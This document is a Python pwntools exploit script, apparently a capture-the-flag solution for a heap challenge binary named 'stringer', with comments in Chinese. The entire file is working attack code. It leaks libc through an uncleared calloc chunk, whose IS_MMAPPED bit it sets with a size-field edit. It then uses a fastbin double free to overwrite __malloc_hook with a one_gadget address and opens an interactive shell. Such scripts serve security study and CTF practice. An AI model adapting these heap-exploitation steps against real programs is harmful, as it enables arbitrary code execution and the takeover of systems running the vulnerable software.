# -*- conding:utf-8 -*-

from pwn import *
import time

context.log_level = 'debug'

#p = process("./stringer",{"PRELOAD":"./libc.so.6"})
p = process("./stringer")
elf = ELF("./stringer")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def New_string(length, content):
	p.recvuntil("choice:")
	p.sendline("1")
	p.recvuntil("please input string length:")
	p.sendline(str(length))
	p.recvuntil("please input the string content:")
	p.sendline(content)
	
def Edit_string(index,byte_id):
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("please input the index:")
	p.sendline(str(index))
	p.recvuntil("input the byte index:")
	p.sendline(str(byte_id))


def Delete_string(index):
	p.recvuntil("choice:")
	p.sendline("4")
	p.recvuntil("please input the index: ")
	p.sendline(str(index))

if __name__=="__main__":
	
	New_string(24,'a'*24) #chunk 0
	New_string(128,'b'*128) #small bin->chunk 1
	New_string(24,'c'*24) #chunk 2

	Delete_string(1) #删除small bin，fd和bk指向main_arena
		
	
	Edit_string(0,24) #编辑操作会将一个地址的内容加1,这里将chunk 2的size从0x91变为0x93，IS_MMAPED标志位置1，calloc不会初始化申请的堆块
	Edit_string(0,24)
		
	New_string(128,'d'*7+'\n') #申请到没清空的chunk 1，泄露main_arena的地址
	
	p.recvuntil("ddddddd\n");
	libc_leak = u64(p.read(6).ljust(8,"\x00"))
	print "libc_leak: " + hex(libc_leak)
	print hex(libc.symbols['__malloc_hook'])
	libc_base = libc_leak - libc.symbols['__malloc_hook'] - 0x68
	print "libc_base: " + hex(libc_base)
	
	New_string(96,'4'*96)  #通过fastbin attack ，double free后修改fastbin 的fd，来申请到.bss地址
	New_string(96,'5'*96)

	Delete_string(4)  
	Delete_string(5)
	
	
	Delete_string(4) #double free
	
	fake_chunk = p64(libc_base + 0x3c4aed)
	
	New_string(96,fake_chunk+'6'*88) 

	New_string(96,'7'*96)

	New_string(96,'8'*96) #申请到malloc_hook附近的地址

	
	one_gedget = 0xf02a4	

	system = p64(libc_base + one_gedget)

	gdb.attach(p)
	pause()
	New_string(96,'f'*19+system+'\n') #将__malloc_hook覆盖成one_gadget的地址
	

#	New_string(10,'9'*10)

	p.recvuntil("choice:")
	p.sendline("1")
	p.recvuntil("please input string length:")
	p.sendline("96") #调用calloc，触发one_gadget
	
	p.interactive()	
	
